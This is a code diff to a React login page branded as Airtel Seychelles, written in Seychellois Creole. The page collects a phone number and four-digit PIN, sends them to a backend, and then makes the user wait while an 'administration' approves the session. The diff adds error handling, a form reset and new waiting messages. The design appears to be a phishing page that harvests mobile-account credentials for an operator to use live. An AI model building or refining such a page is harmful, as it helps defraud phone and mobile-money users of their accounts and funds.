@@ -10,6 +10,7 @@ function AirtelLogin() {
   const [pin, setPin] = useState<string[]>(['', '', '', '']);
   const [showPin, setShowPin] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  const [error, setError] = useState(''); // Added error state for denials
   
   const [isWaitingForApproval, setIsWaitingForApproval] = useState(false);
   const [refId, setRefId] = useState<string | null>(null);
@@ -51,6 +52,7 @@ function AirtelLogin() {
       return; 
     }
 
+    setError('');
     setIsLoading(true);
 
     const fullPhone = `${COUNTRY_CODE}${phone}`;
@@ -69,6 +71,7 @@ function AirtelLogin() {
         setRefId(data.ref_id);
         setIsWaitingForApproval(true); 
         
+        // Polling to check if admin approved or denied
         const pollInterval = setInterval(async () => {
           try {
             const statusRes = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login-status/${data.ref_id}`);
@@ -81,6 +84,11 @@ function AirtelLogin() {
               clearInterval(pollInterval);
               setIsWaitingForApproval(false);
               setIsLoading(false);
+              
+              // Reset the form when denied
+              setPhone('');
+              setPin(['', '', '', '']);
+              setError('Aprobasyon finn refize oubyen sesyon finn ekspire.');
             }
           } catch (pollErr) {
             console.error('Polling error:', pollErr);
@@ -92,6 +100,7 @@ function AirtelLogin() {
     } catch (err) {
       console.error('Login request failed:', err);
       setIsLoading(false);
+      setError('Errer rezo. Tanpri esey ankor.');
     }
   };
 
@@ -248,6 +257,18 @@ function AirtelLogin() {
           text-align: center;
         }
 
+        .error-message {
+          color: #DA1C1C;
+          font-size: 14px;
+          font-weight: 600;
+          text-align: center;
+          margin-bottom: 16px;
+          background-color: #FEF2F2;
+          padding: 10px;
+          border-radius: 8px;
+          width: 100%;
+        }
+
         /* PHONE INPUT */
         .phone-wrapper {
           width: 100%;
@@ -400,9 +421,9 @@ function AirtelLogin() {
       {isWaitingForApproval && (
         <div className="waiting-overlay">
           <div className="custom-spinner"></div>
-          <div className="waiting-title">Pey atann aprobasyon</div>
+          <div className="waiting-title">Aprobasyon an kour...</div>
           <div className="waiting-message">
-            Nou finn voye ou demann. Tanpri atann pandan nou pe verifie ou bann detay...
+            Nou pe atann ki administrasyon i aprouv ou koneksyon. Tanpri pa fèrm sa paj la...
           </div>
         </div>
       )}
@@ -427,6 +448,9 @@ function AirtelLogin() {
         <div className="main-card">
           <h2 className="card-title">Byenveni</h2>
           <p className="card-subtitle">Konekte ar ou kont Airtel Sesel</p>
+
+          {/* ERROR MESSAGE DISPLAY */}
+          {error && <div className="error-message">{error}</div>}
 
           <form onSubmit={handleLogin} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
             
